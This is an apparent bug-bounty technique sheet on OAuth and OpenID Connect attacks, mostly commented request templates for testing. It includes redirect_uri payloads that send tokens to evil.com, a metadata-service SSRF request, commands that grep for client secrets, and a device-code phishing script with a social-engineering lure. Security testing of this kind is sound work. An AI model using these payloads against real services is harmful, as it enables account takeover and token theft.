---
id: "oauth-advanced"
title: "Advanced OAuth & OpenID Connect Attacks"
type: "technique"
category: "web-application"
subcategory: "authentication"
tags: ["oauth", "oidc", "pkce", "authorization-code", "token-theft", "account-linking", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["oauth-jwt-saml-bypasses", "jwt-deep-dive", "account-takeover"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Advanced OAuth & OpenID Connect Attacks

## Beyond Basic redirect_uri
Most hunters test redirect_uri manipulation and stop. The real money is in authorization code interception, PKCE bypass, cross-provider confusion, and token endpoint attacks. Bounties: $5k–$50k+.

## Attack Techniques

### 1. Authorization Code Interception
```
# Authorization code is a one-time-use code exchanged for tokens
# If intercepted before the legitimate client uses it → account takeover

# Via referrer leak:
# 1. Find open redirect or external link on the redirect_uri page
# 2. Authorization code is in the URL as ?code=xxx
# 3. If the redirect page loads external resources → Referer header leaks code

# Example:
# redirect_uri=https://target.com/callback
# /callback page has: <img src="https://analytics.external.com/pixel.png">
# Referer: https://target.com/callback?code=AUTH_CODE_HERE
# Analytics server sees the code

# Via browser history:
# Authorization codes in URL appear in browser history
# Shared computers → history access → code theft
```

### 2. PKCE Bypass / Downgrade
```
# PKCE (Proof Key for Code Exchange) prevents code interception
# But only if PROPERLY enforced

# Test 1: Remove code_challenge entirely
# If server doesn't require PKCE → bypass
GET /authorize?client_id=xxx&response_type=code&redirect_uri=xxx
# (no code_challenge parameter)

# Test 2: Use S256 → plain downgrade
# Send code_challenge with method=plain
# Some servers accept plain even when app uses S256

# Test 3: Reuse code_verifier
# PKCE should be per-flow unique
# Try using the same code_verifier across different auth flows

# Test 4: Empty code_verifier
POST /token
code=AUTH_CODE&code_verifier=&grant_type=authorization_code

# Test 5: code_verifier doesn't match code_challenge
# Some servers don't actually verify the PKCE proof
POST /token
code=AUTH_CODE&code_verifier=anything&grant_type=authorization_code
```

### 3. Token Endpoint Attacks
```
# The /token endpoint exchanges auth code for access token
# Often less protected than /authorize

# Client credential leak:
# client_secret in JavaScript source, mobile app, or GitHub
grep -r "client_secret" app.js bundle.js
strings app.apk | grep -i "client_secret"

# Token endpoint without client authentication:
POST /oauth/token
grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://target.com/callback
# No client_id or client_secret → works if server doesn't enforce

# Token endpoint SSRF:
# Some implementations fetch token from URL in request
POST /oauth/token
token_url=http://169.254.169.254/latest/meta-data/
```

### 4. Cross-Provider Account Linking
```
# Attack: Link your OAuth provider to victim's account

# Scenario 1: Missing state parameter
# 1. Attacker starts OAuth flow, gets callback URL with code
# 2. Attacker sends callback URL to victim (CSRF)
# 3. Victim's browser exchanges code → links ATTACKER's OAuth to VICTIM's account
# 4. Attacker logs in via OAuth → gets victim's account

# Scenario 2: Account linking without re-authentication
# 1. Already logged into victim's account (via session fixation, XSS, etc.)
# 2. Link attacker's Google/GitHub account
# 3. Log out, log back in via OAuth → persistent access

# Scenario 3: Email-based account matching
# 1. Create account on target.com with victim@gmail.com
# 2. Verify via OAuth (Google) with attacker@gmail.com
# 3. Some apps link by email → your OAuth gets victim's account
```

### 5. Scope Escalation
```
# Request more scopes than authorized:

# Original authorized scope:
GET /authorize?scope=read

# Modified:
GET /authorize?scope=read+write+admin
GET /authorize?scope=read%20write%20admin%20delete
GET /authorize?scope=*
GET /authorize?scope=read+admin:full

# Some authorization servers grant requested scope without validation
# Or: Consent screen shows "read" but token has "write" scope

# Token scope verification bypass:
# API may not verify token scope on each request
# Token with scope=read may work on write endpoints
```

### 6. Implicit Flow Token Theft
```
# Implicit flow returns token directly in URL fragment
# Fragment isn't sent to server but IS in browser history

# redirect_uri manipulation for token theft:
GET /authorize?response_type=token&redirect_uri=https://evil.com

# If redirect_uri validation is weak:
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com%40evil.com/
redirect_uri=https://evil.com#target.com

# Token in fragment → evil.com's JavaScript reads location.hash
```

### 7. Device Code Flow Abuse
```
# OAuth Device Code flow (for TVs, IoT, CLI tools)
# Attacker starts device flow → gets user_code
# Tricks victim into entering user_code on their device

# Step 1: Start device authorization
POST /device/code
client_id=XXX&scope=admin

# Response: {"device_code": "xxx", "user_code": "ABCD-1234", "verification_uri": "https://target.com/device"}

# Step 2: Social engineer victim to visit verification_uri and enter user_code
# "Please verify your device at target.com/device with code ABCD-1234"

# Step 3: Poll for token
POST /token
grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=xxx&client_id=XXX

# When victim authorizes → attacker gets their token
```

### 8. Refresh Token Abuse
```
# Refresh tokens are long-lived and powerful

# Test: Refresh token survives password change?
# 1. Login → get refresh token
# 2. Change password
# 3. Use refresh token → still works? → vulnerability

# Test: Refresh token rotation not enforced?
# 1. Use refresh token to get new access token + new refresh token
# 2. Use the OLD refresh token again
# 3. If it still works → no rotation → stolen refresh token = permanent access

# Test: Refresh token scope escalation
POST /token
grant_type=refresh_token&refresh_token=xxx&scope=admin
# Request higher scope on refresh — does it grant it?
```

### 9. OpenID Connect Specific
```
# ID Token manipulation:
# 1. Decode the id_token (JWT)
# 2. Check for algorithm confusion (RS256 → HS256)
# 3. Test none algorithm
# 4. Modify claims: sub, email, groups

# Userinfo endpoint IDOR:
# The /userinfo endpoint returns user data based on access token
# But does it actually validate the token's subject claim?
GET /userinfo
Authorization: Bearer TOKEN_FOR_USER_A
# Modify token sub claim to user B → get user B's info?

# Discovery endpoint information leak:
GET /.well-known/openid-configuration
# Reveals: token endpoint, jwks URI, supported scopes, grant types
# Use to find attack surface

# nonce replay:
# nonce should be single-use to prevent token replay
# Test: Reuse the same nonce across multiple auth flows
# If accepted → replay attacks possible
```

### 10. State Parameter Attacks
```
# State prevents CSRF in OAuth flows
# But implementations are often weak:

# Test: Remove state entirely → does flow still work?
# Test: Empty state → accepted?
# Test: Static state → not tied to session?
# Test: Predictable state → sequential numbers, timestamp-based?

# State fixation:
# 1. Start OAuth flow → get state=XXX
# 2. Abort flow
# 3. Give callback URL with state=XXX to victim
# 4. Victim completes OAuth → state=XXX matches → victim's account linked to attacker's OAuth
```

## Deep Dig Prompts
```
Given this OAuth implementation [describe]:
1. Map the complete flow (authorize → callback → token → resource)
2. Test redirect_uri validation (subdomain, path traversal, url encoding)
3. Check PKCE enforcement (remove, downgrade, mismatch)
4. Test state parameter (remove, reuse, predict)
5. Check scope enforcement (escalation, wildcard)
6. Test refresh token lifecycle (rotation, revocation, scope)
7. Look for client credentials in JavaScript, mobile apps, configs
8. Test cross-provider account linking CSRF
```

## Tools
- Burp Suite OAuth Scanner extension
- jwt_tool (for ID token testing)
- Postman (OAuth flow testing)
- Custom scripts for PKCE/state testing

## Key Endpoints to Test
```
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/authorize
/token
/userinfo
/device/code
/revoke
/introspect
/jwks.json
```
